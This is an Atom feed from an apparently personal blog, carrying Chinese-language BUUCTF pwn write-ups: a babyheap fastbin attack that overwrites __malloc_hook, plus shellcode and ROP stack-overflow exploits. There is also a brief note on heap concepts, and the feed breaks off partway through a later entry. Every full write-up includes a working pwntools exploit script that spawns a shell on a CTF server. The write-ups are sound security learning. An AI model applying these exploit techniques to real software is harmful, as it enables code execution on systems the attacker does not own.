<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-03-10T02:49:24.775Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctf-babyheap_0ctf_2017</title>
    <link href="http://example.com/2022/03/10/buuctf-babyheap-0ctf-2017/"/>
    <id>http://example.com/2022/03/10/buuctf-babyheap-0ctf-2017/</id>
    <published>2022-03-10T02:46:46.000Z</published>
    <updated>2022-03-10T02:49:24.775Z</updated>
    
    <content type="html"><![CDATA[<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><p>根据exp的分析记住他这个是Ubuntu16的环境,不然libc会有细微差别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,26448)</span></span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>) </span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">  p.send(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">  p.recvline()</span><br><span class="line">  <span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 2</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">allocate(<span class="number">0x80</span>) <span class="comment"># 4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)  <span class="comment"># 为了后面malloc做准备，绕过检查</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">1</span>,<span class="string">&#x27;aaaabbbb&#x27;</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">&#x27;bbbbcccc&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4527a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"> </span><br><span class="line">allocate(<span class="number">255</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>我们先创建4个0x10的一个0x80的堆块,然后free掉0,1然后fastbins是单向链表链接的（依赖 fd 指针链接下一个 fastbin），所以我们 free 完之后 ,情况如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">allo(0x10)#0</span><br><span class="line">allo(0x10)#1</span><br><span class="line">allo(0x10)#2</span><br><span class="line">allo(0x10)#3</span><br><span class="line">allo(0x80)#4</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br></pre></td></tr></table></figure><p>情况如下(看第2个堆块,fd指针指向堆块1的堆块)</p><p><img src="../../images/image-20220307203503487.png" alt="image-20220307203503487"></p><p>是修改堆的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>看从开始写入的地址是在0x55c52e9b0010修改地址为开始修改的指针为0x000055c52e9b0080,他那个fd指针,指向的是4个堆这样相当于被free并存放在fastbin中</p><p><img src="../../images/image-20220307210316638.png" alt="image-20220307210316638"></p><p>fastbin</p><p><img src="../../images/image-20220308081822514.png" alt="image-20220308081822514"></p><p>这波,向chunk3写入数据，填充chunk4的size块为0x21。因为fastbin有一个原则：就是通过fd指针连接的一定是相同大小的嘞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure><p>第一个就是申请回来free掉的,chunk2 放入到刚才chunk1所在的位置，第2次申请过来的将chunk2的fd指针指向的chunk4回来，也就是现在index和index4的位置上都是chunk4,下面fill的1和2都是填充数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">fill(1,&#x27;aaaabbbb&#x27;)</span><br><span class="line">fill(2,&#x27;bbbbcccc&#x27;)</span><br></pre></td></tr></table></figure><p>这段代码将chunk4的size改为0x91(至于为什么多余一个1,这个是size的标志位的P位，P=1时,前一个chunk正在使用,这是为了防止chunk进行合并)申请0x80是为了chunk4不与top chunk连接，再将chunk4放入unsorted bin中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) * 3</span><br><span class="line">payload += p64(0x91)</span><br><span class="line">fill(3,payload)</span><br><span class="line">allocate(0x80)</span><br><span class="line">free(4)</span><br></pre></td></tr></table></figure><p>因为之前释放到unsorted bin中，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc_base = u64(dump(2)[:8].strip().ljust(8, &quot;\x00&quot;))-0x3c4b78</span><br><span class="line">log.info(&quot;libc_base: &quot;+hex(libc_base))</span><br></pre></td></tr></table></figure><p><img src="../../images/image-20220309210609005.png" alt="image-20220309210609005"></p><p>magic命令发现发现malloc__hook和libc基地址的偏移为0x3c4b10,然后看向main_arena的地址,发现附近就是__malloc_hook的地址,也是知道malloc_hook和main_arena偏移为-0x10,减去得到malloc_hook地址,那就很好说了</p><p>你main_arena-88-0x10=__malloc_hook的地址</p><p><img src="../../images/image-20220309212006612.png" alt="image-20220309212006612"></p><p>将chunk4 allocate回来后放入fastbin中,然后我们需要在index4后伪造一个fake chunk,然后需要的大小要在0x60-0x7f之间,看wp找的位置是在以下图片下,然后计算的偏移是0x7efd87503aed-libc=0x3c4aed，这也就是修改chunk6的fd指针</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line">payload = p64(libc_base+0x3c4aed)</span><br><span class="line">fill(2, payload)</span><br></pre></td></tr></table></figure><p><img src="../../images/image-20220309220458565.png" alt="image-20220309220458565"></p><p>第一个allocate(0x60)分配chunk6</p><p>第二个allocate(0x60)会分配到chunk6的fd指针所指向的地址,libc_base+0x3c4aed</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)</span><br></pre></td></tr></table></figure><p> p64(0)*2进行内存对齐，因为找到的合适的大小的位置与malloc__hook的偏移为19，所以要对齐内存哦,0x4526a是one_gadget的一个地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p8(0)*3</span><br><span class="line">payload += p64(0)*2</span><br><span class="line">payload += p64(libc_base+0x4527a)</span><br><span class="line">fill(6, payload)</span><br></pre></td></tr></table></figure><p>进行allocate之前需要检查malloc__hook函数的内容，如果为0，就跳过此步骤，如果不为0，就跳转到此部分执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allocate(255)</span><br></pre></td></tr></table></figure><p>总结:</p><p>可能有点不太理解到位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;babyheap-0ctf-2017&quot;&gt;&lt;a href=&quot;#babyheap-0ctf-2017&quot; class=&quot;headerlink&quot; title=&quot;babyheap_0ctf_2017&quot;&gt;&lt;/a&gt;babyheap_0ctf_2017&lt;/h2&gt;&lt;p&gt;根据exp的</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆的概念</title>
    <link href="http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/"/>
    <id>http://example.com/2022/03/09/%E5%A0%86%E7%9A%84%E6%A6%82%E5%BF%B5/</id>
    <published>2022-03-09T06:02:11.000Z</published>
    <updated>2022-03-10T02:44:27.755Z</updated>
    
    <content type="html"><![CDATA[<p>​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉!</p><p>​                                                                                                                                        —-自己学习记录</p><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆?"></a>什么是堆?</h2><p>​        以我的理解就是,堆是可以在程序中提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域,他由低地址向高地址方向增长.学过C语言的其实你也是可以看成结构体数组,然后数组每个元素都会开辟一块内存来储存数据,那么这块用来储存数据的内存就是堆。结构体在BSS段上,其内容就是堆的地址,也就是堆的指针.</p><p>讲讲函数吧！</p><p>申请内存(malloc函数)</p><p>释放内存(free函数)</p><p>突然没灵感了!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    刷的题总将到堆的记录下,熬了有点久的才废了一点点,下面总结一下我对堆的理解,可能有点不明确，请见凉!&lt;/p&gt;
&lt;p&gt;​                                                                         </summary>
      
    
    
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-ciscn_2019_n_5</title>
    <link href="http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/"/>
    <id>http://example.com/2022/01/16/buuctf-ciscn-2019-n-5/</id>
    <published>2022-01-16T14:48:05.000Z</published>
    <updated>2022-01-16T14:48:48.005Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>保护全没开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> text[<span class="number">30</span>]; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me your name&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, name, <span class="number">0x64</span>uLL);<span class="comment">//你第一次写入的值会到name的bss段里面</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow~ nice name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say to me?&quot;</span>);</span><br><span class="line">  gets(text, name);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你第一次写入的值会到name的bss段里面，第2次会有溢出0x20+8的溢出字符,那我们可以在第一个写入到name的bss段里面,然后通过第2次输入溢出来造成溢出,然后rdi指向bss段来执行shellcode</p><p>exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25985</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">name=<span class="number">0x601080</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name\n&quot;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;A&quot;</span>*<span class="number">0x28</span>+p64(name)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ciscn-2019-n-5&quot;&gt;&lt;a href=&quot;#ciscn-2019-n-5&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_n_5&quot;&gt;&lt;/a&gt;ciscn_2019_n_5&lt;/h1&gt;&lt;p&gt;保护全没开&lt;/p&gt;
&lt;figure clas</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-level2_x64</title>
    <link href="http://example.com/2022/01/16/buuctf-level2-x64/"/>
    <id>http://example.com/2022/01/16/buuctf-level2-x64/</id>
    <published>2022-01-16T13:53:58.000Z</published>
    <updated>2022-01-16T13:54:33.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h1><p>这题其实跟babyrop这题差不多的原理,详细的我就不多说了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./level2_x64&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25435</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys_addr =<span class="number">0x0000000000400603</span> </span><br><span class="line">bin_sh = <span class="number">0x0000000000600A90</span></span><br><span class="line">pop_rdi =<span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;level2-x64&quot;&gt;&lt;a href=&quot;#level2-x64&quot; class=&quot;headerlink&quot; title=&quot;level2_x64&quot;&gt;&lt;/a&gt;level2_x64&lt;/h1&gt;&lt;p&gt;这题其实跟babyrop这题差不多的原理,详细的我就不多说了&lt;/p&gt;
&lt;fi</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-[HarekazeCTF2019]baby_rop</title>
    <link href="http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/"/>
    <id>http://example.com/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/</id>
    <published>2022-01-16T13:38:50.000Z</published>
    <updated>2022-01-16T13:39:53.389Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h1><p>看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO<span class="comment">//没开</span></span><br><span class="line">Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们找字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">0000000000601048</span>                 <span class="keyword">public</span> binsh</span><br><span class="line">.data:<span class="number">0000000000601048</span> binsh           db <span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>然后就有如下内容,那我们就可以直接间接性的rop拼接起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./babyrop&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25973</span>)</span><br><span class="line">rdi_ret=<span class="number">0x0000000000400683</span></span><br><span class="line">binsh=<span class="number">0x0000000000601048</span></span><br><span class="line">system_addr=<span class="number">0x00000000004005E3</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HarekazeCTF2019-baby-rop&quot;&gt;&lt;a href=&quot;#HarekazeCTF2019-baby-rop&quot; class=&quot;headerlink&quot; title=&quot;[HarekazeCTF2019]baby_rop&quot;&gt;&lt;/a&gt;[HarekazeCTF2</summary>
      
    
    
    
    
    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-not_the_same_3dsctf_2016</title>
    <link href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/"/>
    <id>http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/</id>
    <published>2022-01-16T13:01:06.000Z</published>
    <updated>2022-01-16T13:01:47.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>看保护</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO//没开</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>我们看向伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-2Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span 